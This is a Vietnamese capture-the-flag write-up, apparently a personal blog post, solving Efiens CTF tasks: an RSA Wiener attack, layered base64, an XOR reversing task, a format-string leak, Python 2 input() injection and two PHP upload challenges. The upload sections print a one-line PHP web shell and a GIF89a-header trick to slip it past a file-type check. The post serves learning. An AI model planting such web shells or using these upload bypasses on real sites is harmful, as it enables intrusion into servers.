# Efiens-CTF
<!-- wp:paragraph -->
<p>Lần thứ 2 mình viết write-up. Lần này thì may mắn giải được nhiều bài hơn :D</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Crypto -  RSA Return </h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài này người ta cho mình 1 file txt có nội dung:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"> <br>n = 17951889010549737984721918145824663920554679073690113998973505408572333276742641211549442546968910749041370414769716560733410432970403684545646457416752331260877428291280133550133766335892077508492112831750286223965487118118078449455995828306158158087615298950458019018872636464541846556840454887386031286367361384479307310797948820322332930676587832056982407942858657009336823861342639013575571730066646908612580722289096377168906858750133837416305928766138797849452634264807768541741213721334698069410535514648821965761969554985645058070289872573972519446789068431446039745171724897115530486733075929027468539085709 <br>e = 9255177507167142640992115273104252200805163770882978057760492509105915396857949293879078511054005577235827085708768831167045390842587585062957494642921811010861109184784686709032635873475486875292991021472964410141501318692753262481398355435957731548292528426001339070251577861110847886108748366618428985360841289665297972636728993183019898021403796030245781826340227545822764255021419145872151942424568692021537123477219364599251751082342131206973867532255034249260929643239644495813782221294729861978022992377755133969736156273046813566502193132634473848456380885594916499296673632186398277871688576908948399894823 <br>c = 13685824754412294767161870154394935171662372556882324072712215825247647777622476307499584456736325913095222244370882491480789672981245694439851052456050523584833628015770017973372002306829891018406870737397171684344383278099231627004851215523325774892491161074742034905463041064379100975545674569478355475517372568602747675072875872365932640799775995640879558478611608524540608348459813065152176210263410374897800276932756067418824325121488395796729583891948687986914406684160387625610994211955475639821415792810780918340686757298888282065017600884226293750275711934514199531243034570947080752198566937262329778067535 </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Cái này là một bài toán RSA đã cho n, e, c. Mình thì không thiên về mảng này nhưng may mắn tìm được 1 source python để giải quyết bài này <a href="https://github.com/pablocelayes/rsa-wiener-attack">Tại Đây.</a><br><br>Đơn giản thay số vào ta ra flag</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">efiens{2_plUs_2_1s_4_m1nUs_1_th4t_3_qu1ck_m4th}</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3> Crypto -  46esaB</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài này đọc ngay tiêu đề là ta biết ngay nó liên quan đến base64 rồi. Xem thử đề nào</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"> <br>Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFjVkZ0UmxSTmJFcEpWbTEwYTFkSFNrZGpSVGxhVmpOU1IxcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMXBGV2xOVWJGcFlaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHdlR0l4U2tkWGJHUllZbFZhY2xWc1VrZFdiRnBZWlVaT1ZXSlZXVEpWYkZKSFZqSkZlVlZZWkZwbGEzQklXWHBHVDJSV1ZuUmhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpKNFQxWlhTbFpYVkVwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkhhRlJXTUZwVFZqSkdSbFJzVG1sU2JrSmFWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RTUmxweFVWaG9hMVpzV2pGV01uaGhZVWRGZUdOR2JGaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXNW9WVlpHWTNoaU1rbDRWMWhvWVZKRlNtRldiWGh6VFRGU1ZtRkhPV2hpUlhCNldUQmFjMWR0U2tkWGJXaGFUVzVvV0ZreFdrZFdWa3B6VkdzMVdGSlZjRWxXYlhCTFRrWlJlRmRzYUZSaE1sSnhWVzE0ZDFkR2JITmhSazVPVFZad2VGVXlkREJXTVZweVkwWndXR0V4Y0ROV2FrWkxWakpPU1dKR1pGZFNWWEJ2Vm10U1MxUXlUWGxVYTFwb1VqTkNWRmxZY0ZkWFZscFlZMFU1YVUxcmJEUldNV2h2V1ZaS1IxTnNaRlZXYkZwNlZHeGFZVmRGTlZaUFZtaFRUVWhDU2xac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFZsSkhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWRvV2xaWFVrZGFWV1JQVWpKS1IyRkhhRTVXYmtKMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNVYxWnNjRWhYVkU1dllWVXhjbUpFVWxkTlYyaDJWMVphUzFKc1RuUlNiR1JwVjBkb05sWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25OT2JFcHpXa2R3YVZORlNrbFdNblJyWXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFdWbGN4TkdReVZrZFdibEpPVmxkU1YxUlhkSGRXTVd4eVZXMUdXRkl3VmpSWk1HaExWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HSXlSa2RUYms1VVlrZG9WbFpzV25kTk1WcHlWMjFHYWxack5YbFhhMXBQWVZaS2NtTkVXbGRpUjA0MFdYcEdWbVF3TVVsaFJrNW9Za2hDV1ZkV1pEQmtiVkY0VjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdqWlJhbEphWVd0YVlWcFZXbGRqTWtaR1QxWmtiR0pZYURaV01XUXdXVmRSZVZaclpGZGliRXBQVm14a1UxWnNVbGhrU0dSVFRWWnNOVnBWYUd0WFIwcEhZMFpvV2sxSGFFeFdha1poVW14a2NtVkdaRTVXYmtKSlYxUkplRk14U1hoalJXaHBVbTFvVkZac2FFTlRNVnAwVFZSQ1ZrMVZiRFZWYkdodlYwWmtTR1ZHV2xwV1JWb3pXVlZhVjJOV1RuUlBWbVJUWWtWd1dsWkhlR3BPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFRWWndhRlY2UmtwbFJsSjFWRzFHVTJKR2NGbFhWM1J2VVRBMWMxZHJhR3RTTUZwWVdXeGFZVmRXV2xoa1J6bG9UVlZzTlZsVldtOVhiR1JKVVd4b1ZrMUdjR2haTVZwUFkxWldjMWRyTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFZUWxsYVZXaExZa1phVlZKc1pGaGhNWEJRV1ZaYVMyTnRUa1ZYYkdSb1RXczBNRmRZY0VkV2JWWlhWRzVXVkdKR1NuQldiRnAzVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWR1VGxSaE1taG9WV3RXWVZsV2NGWmFSWFJVVm1zMWVsbFZaRzlVYXpGV1kwWmFWMkpIVGpSVWEyUlNaVlphY2xwR1pGaFNNMmg1Vmxkd1ExbFhUa2RXYmxKc1UwZFNjMWxyV2xkT1ZuQldZVWQwV0ZJd2NFaFpNRnB2VjJzeFNGVnVXbGROYm1ob1ZqQmFWMk5zY0VoU2JHUlhUVlZ3VWxac1pIZFRNVTE0VTFoc1UyRXlhRzlWYkZKWFYwWnNkR1JGZEU1aVJuQXdWRlpTUTFack1WWk5WRkpYVm0xb2VsWnNXbXRUUjFaSFYyeHdWMUpXYjNwWFZsWmhWakpPVjFSdVVsQldiVkpVV1d0V2QxZHNXa2hsUjNCUFZtMVNTRll5TlU5aGJFcDBaVWRHVlZaV2NGZFVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGSllhR0ZTVjJoVldXdGtiMkl4Vm5GUmJVWlhZa1p3TUZwVmFHdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkpzYUdoTldFSlJWbXRrTkZsWFRuUlVhMVpYWWtkU1ZGUlVTbTlpTVZweVZXdDBVMDFXYkRSV1J6VlhWbTFLUmxOc2FGWmlSa3BZVmpGYVlWSXhiRFpTYld4T1ZqRktTVmRYZEdGV01WWnpXa1ZvYUZKc1NsWldiVEZUVmtad1dHVklUbGRpUjFKNlZrY3hiMVV4V2taWGFscFhWa1ZyZUZscVJscGxSbVJaWTBaYWFWSXlhRnBXYlRFMFpERnNWMk5HV2xoaVdGSnlWbTEwZDJWc1duUk5XRTVYVFZWc05sbFZVbGRXTURGWVZWaGtXRlp0VWxOYVZscGhZMnh3UjFwSGJHbFNXRUkxVm14a01GWXhUWGxUV0docFVtMTRjVlZzWkZOak1WcDBaVVYwYkdKR2NEQlVWVkpYVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5IUmtabFJtUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVazlVVnpGdlUyeFplRlZyY0d4U2F6RTBWVEZvYjJGc1NsaFZiV2hXWWxoTmVGWXdXbHBrTVZweVpFVTFhVkp1UVhkWFZFSlhZVEZrYzFkWVpGZGhiRXBZV1d0a2IyUnNXWGRYYlhSVVVqQmFTRll5ZUhkaFZtUklZVWM1VjJKVVJUQlpla3BQWXpGd1NWTnRkRk5OTUVwVlYxZDBZV1F3TlVkWGJHaE9Wa1ZLVDFWdGVITk9SbGw1VGxVNWFHSkZjRmxaVlZwdlZqSkdjazVXVWxkU1ZuQjZWbXhhUjFkWFJrZFViR1JvVFRCSk1sWnRkR3RPUm14WFZsaHNWR0V4Y0ZsV01HaERWMFphYzFkdVpGTk5Wa1kwVmpKMFQxWnRTa1pUYkZwVlZsWkdNMVZHUlRsUVVUMDk= </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Đầu tiên mình thử decode đoạn trên xem sao. Kết quả nhận được là một chuỗi khác, có vẻ nó vẫn là base64. Mình thử decode đến cùng xem nó ra gì. Sau nhiều lần decode liên tục thì may mắn mình đã ra được flag. Không ngờ bài này nó encode nhiều vậy 😅 </p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Flag: efiens{196}</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3>Reversing - Xor</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài này là một bài Re đơn giản, đầu tiên mình thử xem code nó nào</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":47} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-1.png" alt="" class="wp-image-47"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đọc code thì ta có thể thấy được flag chính là dựa vào flag đã cho xor với key đã cho là ta sẽ ra đáp án. Thử xem flag và key là gì nào !</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":48} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-2.png" alt="" class="wp-image-48"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Có flag, có key. Easy rồi. Viết code xor đơn giản thôi :D</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>key = "M3A8S174"
flag = [40,  85,  40,  93,  61,  66,  76, 107,  18,  75, 
  113,  74,  12,  66,   7, 107,  43,  70,  47, 103, 
   12, 111, 105,  73]
flag_enc = ""
for i in range(0, len(flag)):
	flag_enc += chr(ord(key[i % 8]) ^ flag[i])

print (flag_enc)</code></pre>
<!-- /wp:code -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Flag: efiens{<strong>x0r_s0_fun</strong>^^}</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3>Pwn -  Lottery</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài Pwn này cho code sẵn nên khá là may với một đứa trình gà như mình</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>#include &lt;stdio.h>
#include &lt;stdlib.h>
#include &lt;time.h>

//gcc -m32 -o lottery lottery.c
int main(void)
{
    srand(time(0));
    char name[10];
    int number, s1, s2;
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    printf("Give me your name:");
    fgets(name,10,stdin);

    s1 = rand() % 1000000;
    s2 = rand() % 1000000;
    printf("Hello ");
    printf(name);
    puts("\nPick a number: ");
    scanf("%d",&amp;number);
    if (number != s1 + s2)
    {
        printf("The lucky number is %d\n", s1 + s2);
        puts("Good luck next time");
    }
    else
    {
        system("/bin/cat flag.txt");
    }
    return 0;
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Nhìn vào thì ta biết ngay chỉ cần nhập vào number sao cho number = s1 + s2 là ok. Ta thử chạy chương trình xem</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":49} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-3.png" alt="" class="wp-image-49"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ta thử nhập vào abc, mọi thứ có bình thường. Thử lại lần 2, lần này ta thử %x xem sao. Và ta được f7e19906. Vậy là ta có thấy có khả năng là Format String. Sau một thời gian ngồi thử đủ kiểu và làm việc với GG-sama thì cuối cùng mình cũng ngộ được ra, bài này chỉ cần leak thông tin đơn giản là pass được rồi.  Ta thử nhập %a$d để xem giá trị tại vị trí a. Do mình không biết vị trí của 2 biến s1, s2 nên đành thử thủ công thôi.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":50} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-4.png" alt="" class="wp-image-50"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sau một lúc thì cuối cùng thì</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":51} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-5.png" alt="" class="wp-image-51"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Nhìn vào ta có thể nhận ra tổng 2 cái trên vừa bằng số lucky number. Từ đó ta biết được s1, s2 nằm tại vị trí thứ 6 và thứ 7. Lần này nhập thôi.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":52} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-6.png" alt="" class="wp-image-52"/></figure>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Flag: efiens{ez_vietlot}</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3>Pwn - Cuộc đời bạn màu gì?</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài này cũng được cho code trước. Lại check code xem nào</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>#!/usr/bin/python2.7

import random

colors = ["Do", "Hong", "Tim", "Cam", "Xanh bien", "Xanh la"]

try:
	name = input("Ban ten gi?\n")
except:
	pass

color = random.choice(colors)
print "Cuoc doi ban mau: %s" % color </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Đầu tiên, mình nhìn mình không biết khai thác chỗ nào hết. Lần đầu tiên gặp dạng bài viết code bằng python. Đọc code một vài lần thì mình đoán khả năng khai thác là ở công đoạn nhập. Thử hỏi GG-sama xem sao.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Sau một hồi nghiên cứ thì mình được biết input() nó sẽ nhận giá trị và kiểu của giá trị được nhập mà không thay đổi gì giá trị hết. Và nó gần tương tự với  eval(raw_input()) . Tức là nó sẽ thực thi câu lệnh mà nó được nhận.  Mình thử chạy lệnh ls xem sao. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":53} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-7.png" alt="" class="wp-image-53"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>ô la la có vẻ như ta ra được rồi. Giờ đơn giản rồi, cat file xem nó có gì nào</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":54} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-8.png" alt="" class="wp-image-54"/></figure>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Flag: efiens{python2_iz_da_best}</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3>Web -  Avatar</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Nhìn vào là mình biết bài này khả năng cao là lỗi upload rồi. Tiếc là mình không theo Web nên không rõ lắm. Sau một thời gian được bạn mình chỉ cách khai thác thì cuối cùng mình cũng biết được ít. Với dạng này thường ta sẽ upload một file php nhưng ta đặt thêm đuôi mở rộng cho nó ví dụ php.jpg</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":55} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-9.png" alt="" class="wp-image-55"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Đây là code php đơn giản bạn mình chỉ cho mình</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;?php 
	system($_GET['cmd']); 
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Lưu file lại đặt tên là với đuôi php.jpg . Ở đây mình đặt là avatar.php.jpg <br><br>Trong trường hợp này mình dùng Burp Suite để thực hiện.  Sau khi upload thành công file php, ta sẽ khai thác thôi. Dưới đây là cách mình thực hiện</p>
<!-- /wp:paragraph -->

<!-- wp:gallery {"ids":[56,57,58,59]} -->
<ul class="wp-block-gallery columns-3 is-cropped"><li class="blocks-gallery-item"><figure><img src="https://lr04d.files.wordpress.com/2019/01/avatar1.jpg" alt="" data-id="56" data-link="https://lr04d.wordpress.com/avatar1/" class="wp-image-56"/></figure></li><li class="blocks-gallery-item"><figure><img src="https://lr04d.files.wordpress.com/2019/01/avatar2.jpg" alt="" data-id="57" data-link="https://lr04d.wordpress.com/avatar2/" class="wp-image-57"/></figure></li><li class="blocks-gallery-item"><figure><img src="https://lr04d.files.wordpress.com/2019/01/avatar3.jpg" alt="" data-id="58" data-link="https://lr04d.wordpress.com/avatar3/" class="wp-image-58"/></figure></li><li class="blocks-gallery-item"><figure><img src="https://lr04d.files.wordpress.com/2019/01/avatar4.jpg" alt="" data-id="59" data-link="https://lr04d.wordpress.com/avatar4/" class="wp-image-59"/></figure></li></ul>
<!-- /wp:gallery -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Flag: efiens{whY_d0nT_U_upL0aD_4n_1mag3_file????</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2>Web - Avatar v2</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài này nhìn ban đầu nó khá giống với bài Avatar nhưng lần này thì nó check file của mình.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":60} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-10.png" alt="" class="wp-image-60"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cách bypass nó khá là dễ. Chúng ta chỉ cần thêm <strong>GIF89a</strong> vào đầu code và đổi file thành "php.gif". </p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>GIF89a&lt;?php 
	system($_GET['cmd']); 
?></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p> Đây là ký tự định dạng của file gif. Nên khi kiểm tra file này, máy sẽ kiểm tra các ký tự đầu và xem nó như là file gif. Từ đây ta thực thi như bài trên.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":61} -->
<figure class="wp-block-image"><img src="https://lr04d.files.wordpress.com/2019/01/image-11.png" alt="" class="wp-image-61"/></figure>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">Flag: efiens{whY_d0nT_U_upL0aD_4n_1mag3_file?v?2??}</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":4} -->
<h4>---------------------------------------------</h4>
<!-- /wp:heading -->
